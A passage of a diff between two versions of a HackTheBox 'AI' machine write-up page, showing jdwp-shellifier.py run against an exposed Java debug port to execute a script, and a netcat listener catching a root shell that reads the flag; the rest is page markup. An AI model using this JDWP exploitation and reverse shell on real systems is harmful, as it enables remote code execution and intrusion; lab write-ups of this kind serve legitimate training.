-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[+]</span> Reading settings <span style="color:#ff79c6">for</span> &#39;OpenJDK 64<span style="color:#ff79c6">-</span>Bit Server VM <span style="color:#ff79c6">-</span> 11<span style="color:#ff79c6">.</span><span style="color:#50fa7b">0</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">4</span>&#39;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>#<span style="color:#ff79c6">./</span>jdwp<span style="color:#ff79c6">-</span>shellifier<span style="color:#ff79c6">.</span><span style="color:#50fa7b">py</span> <span style="color:#ff79c6">-</span>t <span style="color:#bd93f9">127.0.0.1</span> <span style="color:#ff79c6">-</span>p <span style="color:#bd93f9">8000</span> <span style="color:#ff79c6">--</span><span style="color:#ff79c6">break</span><span style="color:#ff79c6">-</span>on <span style="color:#f1fa8c">&#34;java.lang.String.indexOf&#34;</span> <span style="color:#ff79c6">--</span>cmd <span style="color:#ff79c6">/</span>tmp<span style="color:#ff79c6">/</span>test<span style="color:#ff79c6">.</span><span style="color:#50fa7b">sh</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">./</span>jdwp<span style="color:#ff79c6">-</span>shellifier<span style="color:#ff79c6">.</span><span style="color:#50fa7b">py</span> <span style="color:#ff79c6">-</span>t <span style="color:#bd93f9">127.0.0.1</span> <span style="color:#ff79c6">-</span>p <span style="color:#bd93f9">8000</span> <span style="color:#ff79c6">--</span><span style="color:#ff79c6">break</span><span style="color:#ff79c6">-</span>on <span style="color:#f1fa8c">&#34;org.apache.tomcat.util.net.NioBlockingSelector\$BlockPoller.events&#34;</span> <span style="color:#ff79c6">--</span>cmd <span style="color:#ff79c6">/</span>tmp<span style="color:#ff79c6">/</span>test<span style="color:#ff79c6">.</span><span style="color:#50fa7b">sh</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[+]</span> Targeting &#39;<span style="color:#bd93f9">127.0.0.1</span><span style="color:#ff79c6">:</span><span style="color:#bd93f9">8000</span>&#39;
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[+]</span> Reading settings <span style="color:#ff79c6">for</span> &#39;OpenJDK <span style="color:#bd93f9">64</span><span style="color:#ff79c6">-</span>Bit Server VM <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">11.0.4</span>&#39;
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">[+]</span> Found Runtime class<span style="color:#ff79c6">:</span> id<span style="color:#ff79c6">=</span>a9d
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[+]</span> Found Runtime<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getRuntime</span><span style="color:#ff79c6">():</span> id<span style="color:#ff79c6">=</span>7f4f84023910
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[+]</span> Created <span style="color:#ff79c6">break</span> event id<span style="color:#ff79c6">=</span>2
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[+]</span> Found Runtime<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getRuntime</span><span style="color:#ff79c6">():</span> id<span style="color:#ff79c6">=</span><span style="color:#bd93f9">7f4f</span><span style="color:#bd93f9">84023910</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[+]</span> Created <span style="color:#ff79c6">break</span> event id<span style="color:#ff79c6">=</span><span style="color:#bd93f9">2</span>
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">[+]</span> Waiting <span style="color:#ff79c6">for</span> an event on &#39;org<span style="color:#ff79c6">.</span><span style="color:#50fa7b">apache</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">tomcat</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">util</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">net</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">NioBlockingSelector$BlockPoller</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">events</span>&#39;
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[+]</span> Received matching event from thread 0xb42
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[+]</span> Received matching event from thread <span style="color:#bd93f9">0xb42</span>
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">[+]</span> Selected payload &#39;<span style="color:#ff79c6">/</span>tmp<span style="color:#ff79c6">/</span>test<span style="color:#ff79c6">.</span><span style="color:#50fa7b">sh</span>&#39;
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">[+]</span> Command string object created id<span style="color:#ff79c6">:</span>b43
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[+]</span> Runtime<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getRuntime</span><span style="color:#ff79c6">()</span> returned context id<span style="color:#ff79c6">:</span>0xb44
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[+]</span> found Runtime<span style="color:#ff79c6">.</span><span style="color:#50fa7b">exec</span><span style="color:#ff79c6">():</span> id<span style="color:#ff79c6">=</span>7f4f84023948
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[+]</span> Runtime<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getRuntime</span><span style="color:#ff79c6">()</span> returned context id<span style="color:#ff79c6">:</span><span style="color:#bd93f9">0xb44</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[+]</span> found Runtime<span style="color:#ff79c6">.</span><span style="color:#50fa7b">exec</span><span style="color:#ff79c6">():</span> id<span style="color:#ff79c6">=</span><span style="color:#bd93f9">7f4f</span><span style="color:#bd93f9">84023948</span>
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">[+]</span> Runtime<span style="color:#ff79c6">.</span><span style="color:#50fa7b">exec</span><span style="color:#ff79c6">()</span> successful<span style="color:#ff79c6">,</span> retId<span style="color:#ff79c6">=</span>b45
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">[!]</span> Command successfully executed
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>We can now see on our local machine a shell connection is established</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~ $ nc -nvlp <span style="color:#bd93f9">8080</span>
+</span></span></code></pre></div><p>We can now see on our local machine a shell connection is established</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~ $ nc -nvlp <span style="color:#bd93f9">8080</span>
 </span></span><span style="display:flex;"><span>root@AI:~# <span style="color:#8be9fd;font-style:italic">pwd</span>
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">pwd</span>
 </span></span><span style="display:flex;"><span>/root
@@ -719,14 +404,58 @@ Trying to break on java.lang.String.indexOf was not very successful; however usi
 </span></span><span style="display:flex;"><span>cat root.txt
 </span></span><span style="display:flex;"><span>0ed*************************eaa3
 </span></span><span style="display:flex;"><span>root@AI:~#
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Challenge finished</p>
+</span></span></code></pre></div><p>Challenge finished</p>
 
       </div>
     </article>
 
     <hr />
+
+    <div class="post-info">
+      
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+
+        <span class="tag"><a href="https://0xade1.github.io/devdraft/series/htb/">htb</a></span>
+        
+
+
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+
+        <span class="tag"><a href="https://0xade1.github.io/devdraft/categories/htb-linux/">htb-linux</a></span>
+        
+    </p>
+
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        1261 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2020-02-09 
+        
+
+         
+          
+        
+      </p>
+    </div>
+      <hr />
       <div class="sharing-buttons">
         
 <a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2020%2f02%2fhtb-ai%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
@@ -819,44 +548,34 @@ Trying to break on java.lang.String.indexOf was not very successful; however usi
 </a>
 
       </div>
-          <hr />
 
     
-      <div class="pagination">
-        <div class="pagination__title">
-          <span class="pagination__title-h"></span>
-        </div>
+<div class="pagination">
+  
+  <hr />
+  <div class="pagination__buttons">
+    
+    <a href="https://0xade1.github.io/devdraft/posts/2020/02/htb-re/" class="button next">
+      <span class="button__icon">←</span>
+      <span class="button__text">HTB - Re</span>
+    </a>
+     
+    <a href="https://0xade1.github.io/devdraft/posts/2020/02/htb-obtain-an-invitation-code-on-hackthebox.eu/" class="button previous">
+      <span class="button__text">HTB - Obtain an invitation code on hackthebox.eu</span>
+      <span class="button__icon">→</span>
+    </a>
+    
+  </div>
+  <hr />
+</div>
 
-        <div class="pagination__buttons">
-          
-            <a href="https://0xade1.github.io/devdraft/posts/2020/02/htb-obtain-an-invitation-code-on-hackthebox.eu/" class="button previous">
-                <span class="button__icon">←</span>
-                <span class="button__text">HTB - Obtain an invitation code on hackthebox.eu</span>
-            </a>
-          
 
-          
-            <a href="https://0xade1.github.io/devdraft/posts/2020/02/htb-re/" class="button next">
-                <span class="button__text">HTB - Re</span>
-                <span class="button__icon">→</span>
-            </a>
-          
-        </div>
-      </div>
+
     
 
-      <hr />
+    
 
-        
-
-
-
-
-
-
-
-
-
+    
 
   </main>
 
@@ -864,41 +583,45 @@ Trying to break on java.lang.String.indexOf was not very successful; however usi
 
             
                 <footer class="footer">
+    
     <div class="footer__inner">
         <div class="footer__content">
             <span>&copy; 2023</span>
-            
+            <span><a href="https://0xade1.github.io/devdraft"></a></span>
+            <span></span>
             <span><a href="https://0xade1.github.io/devdraft/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+            
         </div>
     </div>
+    
+    
     <div class="footer__inner">
         <div class="footer__content">
-            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
-            <span>Made with &#10084;</span>
-          </div>
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span><span>Made with &#10084;</span>
+        </div>
     </div>
+    
 </footer>
 
             
         </div>
 
-        
+    
 
 
 
-<script type="text/javascript" src="https://0xade1.github.io/devdraft/bundle.min.7015b843bafc394b6094818242f153559f5ca94b331b9faaf6132652c59619aefe60ae36e1637f7ee14fd953892639f466c25095c36d42203a1c195313e93212.js" integrity="sha512-cBW4Q7r8OUtglIGCQvFTVZ9cqUszG5&#43;q9hMmUsWWGa7&#43;YK424WN/fuFP2VOJJjn0ZsJQlcNtQiA6HBlTE&#43;kyEg=="></script>
+<script type="text/javascript" src="https://0xade1.github.io/devdraft/bundle.min.4037dc94fd1565c4fd3354e2b4a2d1ff11842c906242435350b4d2d8d6e8b7890da46c0a865173f543a6161c1f4d1c94147f1b907db36489fc2bf5e20d4af75c.js" integrity="sha512-QDfclP0VZcT9M1TitKLR/xGELJBiQkNTULTS2Nbot4kNpGwKhlFz9UOmFhwfTRyUFH8bkH2zZIn8K/XiDUr3XA=="></script>
 
 
 
 
-
- <div id="fastSearch">
-   <ul id="searchResults">
-   </ul>
-   <input id="searchInput" tabindex="0">
- </div>
- <script src="https://cdn.jsdelivr.net/npm/fuse.js@6.6.2/dist/fuse.min.js"></script> 
- <script src="https://0xade1.github.io/devdraft/js/fastsearch.js"></script>
-
-    </body>
+    
+    <div id="fastSearch">
+      <ul id="searchResults"></ul>
+      <input id="searchInput" tabindex="0" />
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/fuse.js@6.6.2/dist/fuse.min.js"></script>
+    
+    <script src="https://0xade1.github.io/devdraft/js/fastsearch.js"></script>
+  </body>
 </html>
